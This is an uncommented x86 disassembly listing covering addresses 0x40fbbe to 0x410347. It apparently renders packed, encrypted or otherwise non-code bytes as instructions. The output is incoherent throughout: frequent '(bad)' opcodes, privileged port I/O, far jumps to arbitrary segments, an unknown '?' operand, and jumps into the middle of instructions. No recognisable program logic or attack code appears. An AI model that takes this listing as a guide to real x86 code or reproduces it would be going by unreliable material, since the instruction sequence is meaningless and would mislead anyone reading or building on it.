  40fbbe:	jae    0x40fc0a
  40fbc0:	inc    esi
  40fbc1:	dec    ebx
  40fbc2:	or     dl,BYTE PTR [edx-0x449beecf]
  40fbc8:	mov    cl,0xf1
  40fbca:	dec    edi
  40fbcb:	pop    esp
  40fbcc:	jg     0x40fb61
  40fbce:	(bad)  
  40fbcf:	shr    BYTE PTR [esi+0x72],cl
  40fbd2:	bound  esi,QWORD PTR [edx+eax*4+0x2bb08d6e]
  40fbd9:	sbb    DWORD PTR [esi+0x17cd6a6e],esi
  40fbdf:	outs   dx,BYTE PTR ss:[esi]
  40fbe1:	mov    eax,0x66b8f20e
  40fbe6:	jno    0x40fc4f
  40fbe8:	scas   eax,DWORD PTR es:[edi]
  40fbe9:	out    dx,al
  40fbea:	mov    eax,ds:0x809d180
  40fbef:	daa    
  40fbf0:	push   ebp
  40fbf1:	xchg   BYTE PTR [esi+0x63b06350],dh
  40fbf7:	ss mov bh,0xe6
  40fbfa:	sub    BYTE PTR [ebp+0x3e],cl
  40fbfd:	stos   DWORD PTR es:[edi],eax
  40fbfe:	push   edx
  40fbff:	inc    edi
  40fc00:	mov    ah,0xb
  40fc02:	sub    ebp,DWORD PTR [ecx-0x61]
  40fc05:	mov    ecx,0x77991a7b
  40fc0a:	mov    BYTE PTR [eax+0x75824d40],0x95
  40fc11:	aam    0x4d
  40fc13:	and    BYTE PTR [edi],0xea
  40fc16:	sub    dh,ch
  40fc18:	(bad)  
  40fc19:	push   0xbd5fea6e
  40fc1e:	fisttp DWORD PTR [ecx+0x69]
  40fc21:	push   ecx
  40fc22:	adc    edx,DWORD PTR [di-0x2ea8]
  40fc27:	(bad)  
  40fc29:	ja     0x40fbb7
  40fc2b:	sbb    ah,BYTE PTR [edi]
  40fc2d:	sub    edx,edi
  40fc2f:	(bad)  
  40fc31:	lock loopne 0x40fbc8
  40fc34:	sbb    al,0x51
  40fc36:	sub    BYTE PTR [esp+esi*1],ah
  40fc39:	popa   
  40fc3a:	mov    edx,0xe294345d
  40fc3f:	ret    
  40fc40:	int    0x9c
  40fc42:	jmp    0x40fca0
  40fc44:	or     eax,0xe32884ec
  40fc49:	mov    dh,0x4a
  40fc4b:	push   ecx
  40fc4c:	dec    esi
  40fc4d:	js     0x40fbd7
  40fc4f:	fwait
  40fc50:	in     eax,0xe2
  40fc52:	mov    ah,0xb0
  40fc54:	mov    dh,0xb2
  40fc56:	pop    ss
  40fc57:	mov    edi,0x9445555e
  40fc5c:	out    dx,al
  40fc5d:	aad    0xc
  40fc5f:	aas    
  40fc60:	aam    0xf7
  40fc62:	jmp    0x1883:0xf0f0c53b
  40fc69:	xchg   edi,eax
  40fc6a:	inc    esp
  40fc6b:	ss pop ecx
  40fc6d:	pop    ss
  40fc6e:	mov    dl,0xa7
  40fc70:	loopne 0x40fcc2
  40fc72:	sub    DWORD PTR [edi-0x201d0037],0x7a
  40fc79:	clc    
  40fc7a:	mov    eax,0x4498cf72
  40fc7f:	ret    0x6899
  40fc82:	sbb    DWORD PTR [edx],esi
  40fc84:	nop
  40fc85:	and    al,bh
  40fc87:	sbb    BYTE PTR [eax-0x73],cl
  40fc8a:	ins    DWORD PTR es:[edi],dx
  40fc8b:	push   ebx
  40fc8c:	in     al,0x4e
  40fc8e:	(bad)  
  40fc8f:	test   al,0x3b
  40fc91:	mov    ebp,0x56122708
  40fc96:	test   al,0x58
  40fc98:	sbb    eax,0xba41e1
  40fc9d:	outs   dx,BYTE PTR ds:[esi]
  40fc9e:	xor    al,BYTE PTR [esp+edi*2+0x6d]
  40fca2:	dec    edi
  40fca3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fca4:	loope  0x40fcd5
  40fca6:	ds retf 0xb8f4
  40fcaa:	pop    edx
  40fcab:	sub    ebx,DWORD PTR [ecx+edx*2+0x279cf478]
  40fcb2:	ficomp DWORD PTR ds:0x63d20fa
  40fcb8:	push   ecx
  40fcb9:	xor    dl,BYTE PTR [eax+edx*1-0x21]
  40fcbd:	xchg   esi,eax
  40fcbe:	mov    dl,0x5b
  40fcc0:	jb     0x40fc72
  40fcc2:	sar    dl,0x48
  40fcc5:	aaa    
  40fcc6:	ret    
  40fcc7:	aas    
  40fcc8:	ficomp DWORD PTR [edx+0x2d]
  40fccb:	cmp    BYTE PTR [eax],0x39
  40fcce:	sub    eax,0x4d8f70d5
  40fcd3:	sub    BYTE PTR [esi-0x43300ae5],dl
  40fcd9:	ds (bad) 
  40fcdb:	leave  
  40fcdc:	dec    ecx
  40fcdd:	mov    ecx,0xef95cd06
  40fce2:	or     edi,DWORD PTR [ebx-0x4f]
  40fce5:	das    
  40fce6:	(bad)  
  40fce7:	fmul   QWORD PTR [ebp-0x6]
  40fcea:	repnz xor dh,cl
  40fced:	in     al,dx
  40fcee:	pop    esp
  40fcef:	xor    DWORD PTR [ebp+0x74],ecx
  40fcf2:	cld    
  40fcf3:	jb     0x40fcda
  40fcf5:	ins    DWORD PTR es:[edi],dx
  40fcf6:	stos   DWORD PTR es:[edi],eax
  40fcf7:	inc    esi
  40fcf8:	mov    eax,0xa99526ea
  40fcfd:	stc    
  40fcfe:	xchg   ecx,eax
  40fcff:	sub    eax,0x894b40c9
  40fd04:	loopne 0x40fcb1
  40fd06:	push   ebx
  40fd07:	in     al,dx
  40fd08:	push   0xe
  40fd0a:	cmp    al,0x1c
  40fd0c:	push   es
  40fd0d:	fwait
  40fd0e:	pop    esp
  40fd0f:	aam    0x85
  40fd11:	inc    ebp
  40fd12:	fst    DWORD PTR [ebp+0x78]
  40fd15:	aaa    
  40fd16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd17:	cmc    
  40fd18:	pop    ss
  40fd19:	adc    al,0xbf
  40fd1b:	je     0x40fd2b
  40fd1d:	add    dh,BYTE PTR ds:0xbc5f8bd9
  40fd23:	loop   0x40fd91
  40fd25:	xor    al,0x8f
  40fd27:	arpl   WORD PTR [ecx+0x43886d41],sp
  40fd2d:	add    al,0x29
  40fd2f:	inc    esi
  40fd30:	or     eax,0x6bbc29da
  40fd35:	out    0xc4,al
  40fd37:	mov    ecx,0x9180d196
  40fd3c:	push   esp
  40fd3d:	icebp  
  40fd3e:	inc    esp
  40fd3f:	and    eax,0x6f944aee
  40fd44:	xchg   edi,eax
  40fd45:	ret    0xc76b
  40fd48:	je     0x40fd66
  40fd4a:	adc    DWORD PTR [ecx+ecx*8-0x713a50b3],ebp
  40fd51:	xchg   edi,eax
  40fd52:	xor    edi,esp
  40fd54:	pop    ebx
  40fd55:	or     bl,ah
  40fd57:	xlat   BYTE PTR ds:[ebx]
  40fd58:	push   ss
  40fd59:	test   DWORD PTR [edi],0x2ecfc6a6
  40fd5f:	xchg   ecx,eax
  40fd60:	sub    DWORD PTR [ecx+0x463feeb5],esi
  40fd66:	test   ch,bl
  40fd68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd69:	xlat   BYTE PTR ds:[ebx]
  40fd6a:	add    eax,0xd126c8c9
  40fd6f:	loope  0x40fdab
  40fd71:	push   edx
  40fd72:	add    DWORD PTR [ebp+0x1dde794d],eax
  40fd78:	xor    BYTE PTR [eax+0x1228403d],0xba
  40fd7f:	mov    ecx,0xe50036f0
  40fd84:	(bad)  
  40fd85:	fisub  WORD PTR [ebx+0x69]
  40fd88:	adc    DWORD PTR [esi],esp
  40fd8a:	shr    BYTE PTR [eax-0x2a],cl
  40fd8d:	or     eax,ecx
  40fd8f:	pop    esp
  40fd90:	dec    ebx
  40fd91:	pop    edi
  40fd92:	inc    eax
  40fd93:	cmp    al,cl
  40fd95:	ret    0x44f9
  40fd98:	inc    edi
  40fd99:	xor    ah,BYTE PTR [esi]
  40fd9b:	cmp    eax,0x6a7ad53a
  40fda0:	adc    eax,0xc4e539f5
  40fda5:	jbe    0x40fde4
  40fda7:	nop
  40fda8:	jo     0x40fd41
  40fdaa:	mov    eax,0x80a83ede
  40fdaf:	pop    edx
  40fdb0:	mov    dl,0xdc
  40fdb2:	or     dh,BYTE PTR es:[ecx-0x1d8e23c1]
  40fdb9:	fst    DWORD PTR [esi-0x14]
  40fdbc:	cmp    al,0x60
  40fdbe:	mov    al,0x17
  40fdc0:	(bad)  
  40fdc2:	mov    ah,0xdb
  40fdc4:	test   ecx,edi
  40fdc6:	add    eax,0xea8d195b
  40fdcb:	ror    BYTE PTR [esp+ebp*2],cl
  40fdce:	xchg   ebx,eax
  40fdcf:	js     0x40fe10
  40fdd1:	add    DWORD PTR [ecx+0x3938dd85],edx
  40fdd7:	enter  0x64e3,0x30
  40fddb:	les    esp,FWORD PTR [esi-0x58]
  40fdde:	inc    edi
  40fddf:	test   DWORD PTR [edi-0x67],ebp
  40fde2:	push   ss
  40fde3:	out    0xc0,al
  40fde5:	pop    eax
  40fde6:	inc    esi
  40fde7:	scas   al,BYTE PTR es:[edi]
  40fde8:	(bad)  
  40fde9:	adc    DWORD PTR [ecx+0x9],edi
  40fdec:	mov    al,ds:0x3ac8ddc0
  40fdf1:	je     0x40fe64
  40fdf3:	xchg   ebp,eax
  40fdf4:	mov    ecx,DWORD PTR [ecx+0x26afa12]
  40fdfa:	push   0xffffffa7
  40fdfc:	jb     0x40fe36
  40fdfe:	mov    ch,0x36
  40fe00:	in     al,dx
  40fe01:	mov    ebp,0xe7009917
  40fe06:	out    0x83,al
  40fe08:	outs   dx,BYTE PTR ds:[esi]
  40fe09:	popa   
  40fe0a:	xor    BYTE PTR [ebx+0xd373e8b],dl
  40fe10:	lods   eax,DWORD PTR ds:[esi]
  40fe11:	add    al,0x55
  40fe13:	jns    0x40fe18
  40fe15:	xchg   edi,eax
  40fe16:	jp     0x40fe46
  40fe18:	pop    edx
  40fe19:	lahf   
  40fe1a:	xchg   eax,edi
  40fe1c:	imul   BYTE PTR [edx+eax*1+0xc]
  40fe20:	inc    ebx
  40fe21:	arpl   WORD PTR [ebp+0x1],di
  40fe24:	ja     0x40fe5c
  40fe26:	out    dx,eax
  40fe27:	dec    edx
  40fe28:	call   0x1006:0xd588c531
  40fe2f:	xchg   bh,bl
  40fe31:	or     DWORD PTR [edx],ebx
  40fe33:	addr16 push es
  40fe35:	adc    dl,BYTE PTR [eax-0x4]
  40fe38:	outs   dx,BYTE PTR ds:[esi]
  40fe39:	xor    ebp,eax
  40fe3b:	dec    edx
  40fe3c:	and    BYTE PTR [edx+0x5a],bl
  40fe3f:	xchg   esp,eax
  40fe40:	fnsave [eax+0x9]
  40fe43:	push   es
  40fe44:	jg     0x40fe1a
  40fe46:	test   BYTE PTR [ecx-0x269489c1],al
  40fe4c:	push   cs
  40fe4d:	ins    BYTE PTR es:[edi],dx
  40fe4e:	jne    0x40fec3
  40fe50:	mov    esp,0xccbbe584
  40fe55:	mov    ah,0x2f
  40fe57:	push   edi
  40fe58:	xor    DWORD PTR [edx-0x4a497ee4],ebx
  40fe5e:	xor    BYTE PTR [eax+0x2649500e],bl
  40fe64:	jae    0x40febc
  40fe66:	add    ah,BYTE PTR [eax]
  40fe68:	lods   eax,DWORD PTR ds:[esi]
  40fe69:	pushf  
  40fe6a:	sbb    ebp,DWORD PTR [ecx-0x7d82033d]
  40fe70:	ja     0x40febd
  40fe72:	mov    bl,bh
  40fe74:	sub    BYTE PTR [ebp+0x8],0x3d
  40fe78:	ja     0x40febd
  40fe7a:	(bad)  
  40fe7b:	cmp    bh,BYTE PTR [edi]
  40fe7d:	mov    ss,WORD PTR [edi]
  40fe7f:	fwait
  40fe80:	and    al,0xd
  40fe82:	mul    DWORD PTR [edx+0x59]
  40fe85:	dec    ebp
  40fe86:	fidivr WORD PTR [eax+0x79eaeb83]
  40fe8c:	mov    al,ds:0xa7a9d059
  40fe91:	loopne 0x40fee5
  40fe93:	ror    DWORD PTR [ecx],cl
  40fe95:	lock mov eax,ds:0xb172ceb6
  40fe9b:	sub    ah,BYTE PTR [ebx-0x5db2521c]
  40fea1:	sbb    ebp,ebx
  40fea3:	imul   edi,DWORD PTR [edx-0x4d],0x28
  40fea7:	mov    al,0xdf
  40fea9:	popa   
  40feaa:	in     al,dx
  40feab:	dec    esi
  40feac:	hlt    
  40fead:	data16 sub al,0x9a
  40feb0:	in     eax,0xd
  40feb2:	cmp    edi,DWORD PTR [ecx-0x536e0db4]
  40feb8:	sub    al,0x5f
  40feba:	xchg   edx,eax
  40febb:	mov    bl,0x36
  40febd:	test   eax,0xf0a22aa6
  40fec2:	shl    BYTE PTR [eax+0x26205a86],cl
  40fec8:	inc    cl
  40feca:	push   ecx
  40fecb:	push   edx
  40fecc:	cmp    edx,DWORD PTR [esi+0x321493]
  40fed2:	lea    edi,[esp+ebp*8-0x59]
  40fed6:	sub    al,0xe7
  40fed8:	add    ebp,edi
  40feda:	pop    edi
  40fedb:	rcl    BYTE PTR [edi+0x4102e040],1
  40fee1:	test   al,0x55
  40fee3:	jmp    0x6eb0:0x24021b3e
  40feea:	leave  
  40feeb:	scas   al,BYTE PTR es:[edi]
  40feec:	mov    ds:0x245c0f50,al
  40fef1:	aaa    
  40fef2:	(bad)  
  40fef3:	jbe    0x40fee3
  40fef5:	xchg   edi,eax
  40fef6:	sub    ch,BYTE PTR [esi+0x48f3eb78]
  40fefc:	inc    BYTE PTR [ebp+0x17]
  40feff:	xchg   esi,eax
  40ff00:	cmp    DWORD PTR [esi-0x1],ebx
  40ff03:	je     0x40ff2a
  40ff05:	inc    esp
  40ff06:	and    bl,BYTE PTR [edx+eiz*4]
  40ff09:	dec    edi
  40ff0a:	in     eax,dx
  40ff0b:	ins    DWORD PTR es:[edi],dx
  40ff0c:	ret    
  40ff0d:	xchg   esi,eax
  40ff0e:	add    ebx,ebx
  40ff10:	mov    BYTE PTR [edx],cl
  40ff12:	xor    BYTE PTR [ebx-0x64],dl
  40ff15:	jns    0x40ff8f
  40ff17:	mov    DWORD PTR [edx-0x46],ebx
  40ff1a:	(bad)
  40ff1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff1e:	push   cs
  40ff1f:	ins    DWORD PTR es:[edi],dx
  40ff20:	(bad)  
  40ff22:	cmp    bl,BYTE PTR [ebx]
  40ff24:	dec    ebx
  40ff25:	mov    cx,si
  40ff28:	mov    DWORD PTR [eax-0x69],edx
  40ff2b:	retf   0x24e2
  40ff2e:	mov    esi,eax
  40ff30:	adc    eax,0x71eff8e8
  40ff35:	or     DWORD PTR [ebp-0x2a133bd9],esi
  40ff3b:	cmp    DWORD PTR [esi-0x64],esp
  40ff3e:	clc    
  40ff3f:	inc    ecx
  40ff40:	pop    ss
  40ff41:	xchg   esi,eax
  40ff42:	dec    esi
  40ff43:	leave  
  40ff44:	nop
  40ff45:	mov    eax,ds:0xa23d5832
  40ff4a:	pop    ecx
  40ff4b:	(bad)  
  40ff4c:	xchg   esi,eax
  40ff4d:	std    
  40ff4e:	pop    ebx
  40ff4f:	in     al,dx
  40ff50:	mov    ebp,0xa9c7ce9
  40ff55:	and    DWORD PTR [eax],0xffffff84
  40ff58:	pop    edi
  40ff59:	sti    
  40ff5a:	fwait
  40ff5b:	retf   0xa8ef
  40ff5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff5f:	pop    ds
  40ff60:	test   BYTE PTR [esi-0x36c29ba],0x6d
  40ff67:	adc    BYTE PTR [ebx-0xd],dh
  40ff6a:	add    al,dl
  40ff6c:	push   ds
  40ff6d:	scas   eax,DWORD PTR es:[edi]
  40ff6e:	mov    ds:0x82ad20a8,al
  40ff73:	bound  edi,QWORD PTR [edi+ebp*8-0x7ae6df7]
  40ff7a:	(bad)  
  40ff7c:	cli    
  40ff7d:	test   BYTE PTR [esi+0x32],ch
  40ff80:	xchg   esi,eax
  40ff81:	jg     0x40ff6e
  40ff83:	sbb    bl,BYTE PTR [ecx-0x7c]
  40ff86:	out    0xf0,eax
  40ff88:	jge    0x40fff8
  40ff8a:	into   
  40ff8b:	push   edi
  40ff8c:	mov    ecx,0xb6798b8e
  40ff91:	(bad)  
  40ff92:	xchg   DWORD PTR [esp+edx*4],ebp
  40ff95:	lods   al,BYTE PTR ds:[esi]
  40ff96:	(bad)  
  40ff97:	stc    
  40ff98:	pop    ss
  40ff99:	cli    
  40ff9a:	cwde   
  40ff9b:	sub    DWORD PTR [esi-0x38320b68],ebp
  40ffa1:	and    eax,DWORD PTR [ebx]
  40ffa3:	cld    
  40ffa4:	(bad)  
  40ffa5:	fs lahf 
  40ffa7:	inc    eax
  40ffa8:	ror    BYTE PTR [eax-0x185e248b],0xb
  40ffaf:	test   al,0xcb
  40ffb1:	js     0x40ff77
  40ffb3:	mov    ebx,0x79839fb1
  40ffb8:	dec    esi
  40ffb9:	addr16 not bh
  40ffbc:	or     al,0x7
  40ffbe:	pop    ecx
  40ffbf:	cmp    edi,ecx
  40ffc1:	lea    edx,[esi]
  40ffc3:	fisubr WORD PTR [esp+edx*8+0x3838bdfb]
  40ffca:	icebp  
  40ffcb:	clc    
  40ffcc:	inc    edx
  40ffcd:	mov    cl,0x73
  40ffcf:	and    DWORD PTR [edx+0x2eafe732],0xffffffe6
  40ffd6:	sbb    dh,dh
  40ffd8:	pop    ss
  40ffd9:	(bad)  
  40ffda:	ins    BYTE PTR es:[edi],dx
  40ffdb:	xchg   edi,esi
  40ffdd:	cmp    ch,BYTE PTR [ecx-0x48b08714]
  40ffe3:	mov    edx,0xe9223d9f
  40ffe8:	loop   0x410054
  40ffea:	lods   al,BYTE PTR ds:[esi]
  40ffeb:	cmp    eax,0xc037a269
  40fff0:	mov    edx,DWORD PTR [ebx+ecx*4]
  40fff3:	adc    edi,DWORD PTR [edx+0x23]
  40fff6:	jmp    0xd3c5:0x8b5f1991
  40fffd:	sbb    BYTE PTR [ebp-0x35],dl
  410000:	aam    0xa7
  410002:	sti    
  410003:	call   0xaba610ff
  410008:	cld    
  410009:	leave  
  41000a:	in     eax,0x2c
  41000c:	dec    edx
  41000d:	ficomp WORD PTR ds:0x39753c0e
  410013:	jmp    0x8079de8
  410018:	or     ch,BYTE PTR ds:0x5a2958e3
  41001e:	inc    ebp
  41001f:	sub    eax,0x7614ed37
  410024:	mov    ecx,0xce4281f6
  410029:	xlat   BYTE PTR ds:[ebx]
  41002a:	jmp    0x41001d
  41002c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41002d:	es adc eax,0xa579675c
  410033:	mov    eax,ds:0x731cd905
  410038:	add    cl,BYTE PTR [edx+0x6b5da41]
  41003e:	and    eax,0xb02f6681
  410043:	loop   0x40ffcb
  410045:	adc    al,0xa9
  410047:	mov    dl,0x69
  410049:	fnsave [eax-0x23fad83d]
  41004f:	xchg   esi,eax
  410050:	sub    al,bl
  410052:	and    al,0x63
  410054:	or     ebp,ebx
  410056:	ins    DWORD PTR es:[edi],dx
  410057:	sub    al,0x7c
  410059:	call   0xe8170d9b
  41005e:	stos   DWORD PTR es:[edi],eax
  41005f:	inc    ebp
  410060:	in     eax,dx
  410061:	lea    esp,[esi]
  410063:	fadd   QWORD PTR [ecx-0x3333a195]
  410069:	mov    DWORD PTR ds:0xdcc5620c,ecx
  41006f:	or     DWORD PTR [eax],0xb2db0eaf
  410075:	pop    ds
  410076:	push   edx
  410077:	xchg   BYTE PTR fs:[edx+ebx*1+0x12ee3677],dl
  41007f:	(bad)  
  410081:	push   0x6d
  410083:	adc    eax,0x738dc446
  410088:	or     DWORD PTR fs:[edx-0x25],esp
  41008c:	(bad)  
  41008d:	rcl    ebp,cl
  41008f:	fwait
  410090:	dec    ebp
  410091:	dec    BYTE PTR [edx-0x744298eb]
  410097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410098:	dec    esp
  410099:	push   0xf40edd08
  41009e:	pop    ds
  41009f:	ror    al,0xd1
  4100a2:	push   ebp
  4100a3:	pusha  
  4100a4:	xchg   edx,eax
  4100a5:	lock jne 0x41011d
  4100a8:	inc    ebx
  4100a9:	jl     0x4100da
  4100ab:	xor    bh,BYTE PTR ds:0x5dab4a50
  4100b1:	lahf   
  4100b2:	mov    dl,0x65
  4100b4:	mov    ah,BYTE PTR [eax+0x66894025]
  4100ba:	daa    
  4100bb:	lods   al,BYTE PTR ds:[esi]
  4100bc:	out    dx,eax
  4100bd:	and    DWORD PTR [ecx],ebx
  4100bf:	adc    dl,bl
  4100c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100c2:	sbb    ebp,DWORD PTR [ebx]
  4100c4:	std    
  4100c5:	icebp  
  4100c6:	sub    eax,0x77f838ac
  4100cb:	mov    edi,0x882c4f8
  4100d0:	mov    ah,0xd0
  4100d2:	hlt    
  4100d3:	push   0xfffffff6
  4100d5:	(bad)  [eax]
  4100d7:	mov    esp,0xe05f145b
  4100dc:	adc    ebp,DWORD PTR [ecx-0x471ad6e9]
  4100e2:	scas   al,BYTE PTR es:[edi]
  4100e3:	dec    ebp
  4100e4:	mov    ah,0x50
  4100e6:	mov    ebx,eax
  4100e8:	xor    al,0xf1
  4100ea:	repz mov bl,0xb6
  4100ed:	cmp    DWORD PTR [edx+ebx*4+0x2],esp
  4100f1:	pop    esi
  4100f2:	xor    DWORD PTR [edi-0x39],ebx
  4100f5:	lea    ebx,[eax+0x2ae84c2a]
  4100fb:	fs aas 
  4100fd:	jmp    0xba79234a
  410102:	mov    ch,0xd9
  410104:	jo     0x41011c
  410106:	lods   eax,DWORD PTR ds:[esi]
  410107:	mov    bl,0xe3
  410109:	arpl   WORD PTR [eax-0x3b],cx
  41010c:	or     eax,0x10636b54
  410111:	jnp    0x4100bc
  410113:	dec    ecx
  410114:	jbe    0x410136
  410116:	cmp    dl,BYTE PTR [ebx+0x31c3adf4]
  41011c:	jg     0x410176
  41011e:	push   es
  41011f:	or     eax,0x3f720a74
  410124:	pushf  
  410125:	and    al,0xa2
  410127:	leave  
  410128:	pop    ebp
  410129:	fistp  DWORD PTR [edx]
  41012b:	push   cs
  41012c:	jge    0x4100f6
  41012e:	dec    eax
  41012f:	test   BYTE PTR gs:[ebp+ecx*1+0x23],bh
  410134:	push   eax
  410135:	cmp    al,0xe9
  410137:	cmp    DWORD PTR [edx-0x324b453],ecx
  41013d:	cmp    ebx,eax
  41013f:	lods   al,BYTE PTR ds:[esi]
  410140:	call   0x6763:0x4555324c
  410147:	neg    BYTE PTR [edx+ebp*4-0x6de1c02e]
  41014e:	cmp    edi,DWORD PTR [esi+0x56]
  410151:	(bad)  
  410152:	jmp    0x543d:0x6c458620
  410159:	in     al,dx
  41015a:	and    dl,BYTE PTR [edi-0x68]
  41015d:	popa   
  41015e:	sub    ecx,DWORD PTR [eax-0x4da891b9]
  410164:	test   esi,esp
  410166:	es repz mov esp,0xe032dbf5
  41016d:	mov    edi,ebp
  41016f:	add    BYTE PTR ds:0xf1cf1052,al
  410175:	sub    dl,dl
  410177:	popa   
  410178:	dec    esp
  410179:	loopne 0x410117
  41017b:	mov    ds:0x3c914346,al
  410180:	pop    ds
  410181:	imul   esp,DWORD PTR [esi-0x2],0x5d
  410185:	fwait
  410186:	mov    bl,bh
  410188:	jnp    0x410136
  41018a:	jecxz  0x410199
  41018c:	in     al,0xcf
  41018e:	stc    
  41018f:	lods   al,BYTE PTR ds:[esi]
  410190:	adc    BYTE PTR [esi-0x6c],bh
  410193:	add    eax,0xa69f2a5a
  410198:	test   al,0xc5
  41019a:	(bad)  [edx-0x63]
  41019d:	shl    DWORD PTR [edx+edx*4],0xdc
  4101a1:	push   es
  4101a2:	ins    BYTE PTR es:[edi],dx
  4101a3:	(bad)  
  4101a4:	mov    ah,0x72
  4101a6:	push   edi
  4101a7:	int3   
  4101a8:	inc    edi
  4101a9:	pop    es
  4101aa:	out    0x7,al
  4101ac:	aaa    
  4101ad:	repz ja 0x410198
  4101b0:	shl    cl,0x33
  4101b3:	scas   al,BYTE PTR es:[edi]
  4101b4:	jle    0x41017d
  4101b6:	popw   ds
  4101b8:	mov    dh,0xab
  4101ba:	cmc    
  4101bb:	mov    ds:0x36dad6fd,eax
  4101c0:	jge    0x410193
  4101c2:	sbb    esp,DWORD PTR [esi-0x4f]
  4101c5:	arpl   WORD PTR [ecx-0x4c],sp
  4101c8:	adc    ebx,edi
  4101ca:	fst    QWORD PTR [eax]
  4101cc:	jl     0x41016a
  4101ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101cf:	xchg   edi,eax
  4101d0:	mov    WORD PTR [edx],fs
  4101d2:	or     al,0x8
  4101d4:	add    al,BYTE PTR [ebp-0x7]
  4101d7:	int    0x92
  4101d9:	lds    eax,FWORD PTR [edi]
  4101db:	add    BYTE PTR [ebx+esi*1+0x2f],bl
  4101df:	fiadd  WORD PTR [ecx+0x70]
  4101e2:	xchg   ecx,eax
  4101e3:	adc    edx,ebx
  4101e5:	daa    
  4101e6:	xchg   esp,eax
  4101e7:	je     0x4101cc
  4101e9:	stos   DWORD PTR es:[edi],eax
  4101ea:	aaa    
  4101eb:	mov    dl,0xc5
  4101ed:	aad    0x4a
  4101ef:	ja     0x4101d4
  4101f1:	push   ebx
  4101f2:	mov    ds:0xcc9c7609,eax
  4101f7:	mov    ah,0xe1
  4101f9:	jns    0x410211
  4101fb:	ds pusha 
  4101fd:	test   BYTE PTR [eax+eax*4+0x11],dh
  410201:	sub    edx,DWORD PTR [edx-0x50547475]
  410207:	in     eax,0x89
  410209:	pop    eax
  41020a:	aaa    
  41020b:	mov    ds:0x3c91f131,al
  410210:	jnp    0x410193
  410212:	es lahf 
  410214:	scas   al,BYTE PTR es:[edi]
  410215:	adc    al,0x79
  410217:	enter  0x9bfc,0x2c
  41021b:	xchg   DWORD PTR [ebx],edx
  41021d:	mov    fs,WORD PTR [ebx-0x1c]
  410220:	gs mov eax,0x7deecad5
  410226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410227:	inc    esi
  410228:	in     al,dx
  410229:	ret    
  41022a:	scas   al,BYTE PTR es:[edi]
  41022b:	imul   esi,DWORD PTR [eax+0x19],0x597205cb
  410232:	pop    ss
  410233:	inc    ebp
  410234:	sbb    ecx,DWORD PTR [edi+0x29c41908]
  41023a:	pop    edx
  41023b:	call   0x8eae:0x1451b69e
  410242:	mov    dl,0xc0
  410244:	not    DWORD PTR [eax-0x1b]
  410247:	jno    0x4102c7
  410249:	add    eax,0x1a4e71b
  41024e:	mov    ?,WORD PTR [ecx+0x7]
  410251:	cmp    bl,0xc4
  410254:	scas   al,BYTE PTR es:[edi]
  410255:	xchg   ecx,eax
  410256:	in     al,0x4a
  410258:	out    dx,al
  410259:	push   0xcd2b3559
  41025e:	call   0x4484:0x7c6d6812
  410265:	leave  
  410266:	test   eax,0xdf73bc8d
  41026b:	hlt    
  41026c:	test   DWORD PTR [eax-0x30],ecx
  41026f:	mov    eax,ds:0xf63a6147
  410274:	adc    al,0x36
  410276:	jg     0x410284
  410278:	out    dx,eax
  410279:	add    cl,BYTE PTR [edx+0x318b02cf]
  41027f:	test   dh,dh
  410281:	jmp    FWORD PTR [edx+0x6ef64453]
  410287:	int    0xcd
  410289:	or     al,0x2a
  41028b:	push   0xffffffda
  41028d:	shl    cl,0x15
  410290:	sub    DWORD PTR [edx],esp
  410292:	test   BYTE PTR [edi],ch
  410294:	xlat   BYTE PTR ds:[ebx]
  410295:	mov    ebp,0x55c71e0c
  41029a:	push   eax
  41029b:	sar    DWORD PTR [esi-0x6e7e1418],1
  4102a1:	sub    al,0x96
  4102a3:	lock in al,0x3a
  4102a6:	xchg   ecx,eax
  4102a7:	jnp    0x410260
  4102a9:	sub    eax,0x14b27b63
  4102ae:	mov    BYTE PTR [ebx-0x64fde548],dh
  4102b4:	push   ebx
  4102b5:	cmp    bl,BYTE PTR [esi+0x6b]
  4102b8:	ss xchg ebp,eax
  4102ba:	add    BYTE PTR [edi-0x50549f2e],dl
  4102c0:	pop    esp
  4102c1:	lock adc ebp,DWORD PTR [eax+0x5e]
  4102c5:	mov    esp,0x40cda3f7
  4102ca:	popf   
  4102cb:	gs (bad) 
  4102cd:	or     al,0x81
  4102cf:	lea    ecx,[ebx+0x56]
  4102d2:	pop    esi
  4102d3:	adc    BYTE PTR [ebx+0x6e13e94a],0x7e
  4102da:	in     al,dx
  4102db:	or     DWORD PTR [ecx-0x7d],edi
  4102de:	sub    al,0x33
  4102e0:	xor    ax,0xe102
  4102e4:	mov    ds:0x2f2c8e5a,al
  4102e9:	fadd   DWORD PTR [edi+0x46257b9]
  4102ef:	popa   
  4102f0:	out    dx,al
  4102f1:	test   edx,edi
  4102f3:	loope  0x410293
  4102f5:	std    
  4102f6:	push   0x38
  4102f8:	sbb    bl,BYTE PTR [ebp+0xae270ab]
  4102fe:	inc    ecx
  4102ff:	push   ebx
  410300:	aad    0x3f
  410302:	push   ss
  410303:	arpl   WORD PTR ds:0x5dcdc231,sp
  410309:	mov    bl,0xaa
  41030b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41030c:	inc    edi
  41030d:	inc    ebp
  41030e:	add    dl,BYTE PTR [ebx+0x1b15d74c]
  410314:	test   eax,0xaa66104c
  410319:	mov    DWORD PTR [ebp+ecx*4+0x48a41de8],edx
  410320:	lea    esp,[edx+0x53]
  410323:	cli    
  410324:	mov    ebp,0x998c3987
  410329:	push   ecx
  41032a:	sub    al,0xac
  41032c:	jnp    0x4102da
  41032e:	ror    BYTE PTR [edi-0x33b4e73e],0x4b
  410335:	pop    edx
  410336:	enter  0x9dc9,0x23
  41033a:	js     0x410374
  41033c:	lods   al,BYTE PTR ds:[esi]
  41033d:	pop    ecx
  41033e:	test   BYTE PTR [ebp-0x21],bl
  410341:	pusha  
  410342:	mov    bl,0xbb
  410344:	stos   BYTE PTR es:[edi],al
  410345:	loope  0x410345
  410347:	in     eax,0xf3
